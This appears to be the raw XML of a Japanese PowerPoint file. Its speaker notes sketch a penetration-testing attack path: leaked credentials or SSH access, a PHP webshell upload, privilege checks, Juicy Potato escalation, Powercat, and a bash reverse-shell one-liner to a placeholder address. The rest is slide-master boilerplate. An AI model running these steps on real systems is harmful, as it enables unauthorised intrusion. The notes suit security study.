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8" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId6"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="258" r:id="rId2"/>
    <p:sldId id="261" r:id="rId3"/>
    <p:sldId id="262" r:id="rId4"/>
    <p:sldId id="264" r:id="rId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DB0B0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226" autoAdjust="0"/>
    <p:restoredTop sz="73624" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="70" d="100"/>
          <a:sy n="70" d="100"/>
        </p:scale>
        <p:origin x="1296" y="3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notesMaster" Target="notesMasters/notesMaster1.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43A4C6B-DF72-4723-951D-FA8DD9825525}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</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68E2AA6-84B2-43A5-87C5-3D8050F95EA0}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3352324107"/>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認証情報が落ちてる→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートが開いてる→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で入る</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ない場合は？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>落ちていない→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>fileupload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>がありそう→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（必要なら</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Burp suite)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>を</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>upload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で初期侵入</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ない場合は？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>priv</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　権限の確認コマンド</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Qiita.com/nozomi2025/items/51ec1b574facd5cf89ca </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　このページの流れで実行したい→ちゃんと理解</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>についてちゃんと調べて理解</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サイトに</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>upload file</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の項目があるかどうか？なかった場合はどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートは本当にあいてるか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>永続化の方法は本当にそれだけか、それが通らなかったら？</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>シェルリスナーの設置は</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に対して有効か？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>への</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のダウンロードはどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Php</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　→　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>file upload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>がある場合</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Bash –c ‘bash –I &gt;&amp; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipaddress</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/port 0&gt;&amp;1’ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>←</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>では使えないよ（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>👇</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Powercat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に変更</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のローカル特権昇格ツール、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サービスとトークン偽装の仕組みを悪用して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>SYSTEM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>権限を奪取</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>「</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Componet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> Object Model</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>」（オブジェクト指向のソフトウェアコンポーネントモデル）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Shell.Application</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>や</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Wscript.Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>異なるプログラミング言語や環境で作成された部品通しを共通のプロトコルでつなぐための仕組み（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>C#</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>VB</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Python</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>DCOM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（上記の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>をネットワーク越しでも使えるようにした拡張機能）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="スライド番号プレースホルダー 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C68E2AA6-84B2-43A5-87C5-3D8050F95EA0}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="316702825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C68E2AA6-84B2-43A5-87C5-3D8050F95EA0}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="198471729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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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ja-JP" altLang="en-US"/>
              <a:t>マスター サブタイトルの書式設定</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</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E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="71832377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Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>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10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</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E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="210346809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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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ja-JP" altLang="en-US"/>
              <a:t>マスター テキストの書式設定</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</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E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="315537328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5" name="Date Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="327021283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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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4" name="Content Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="839788" y="2505075"/>
            <a:ext cx="5157787" cy="3684588"/>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6" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2505075"/>
            <a:ext cx="5183188" cy="3684588"/>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7" name="Date Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="188576156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Date Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Slide Number Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
